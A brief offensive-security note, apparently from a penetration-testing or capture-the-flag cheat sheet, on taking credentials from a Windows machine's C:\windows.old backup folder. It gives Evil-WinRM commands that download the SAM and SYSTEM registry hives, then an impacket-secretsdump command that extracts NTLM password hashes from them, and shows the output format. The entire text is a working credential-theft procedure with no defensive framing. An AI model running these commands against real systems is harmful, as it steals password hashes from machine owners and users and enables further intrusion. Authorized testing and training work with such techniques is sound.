# windows.old

`C:\windows.old` contains backup files, of which we can harvest credentials from.

```bash
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
```

We can now dump credentials with the following command:

```bash
impacket-secretsdump LOCAL -sam SAM -system SYSTEM
```

The output will be in the following formatting:

```
Username:UserID:LM Hash:NTLM Hash:::
```
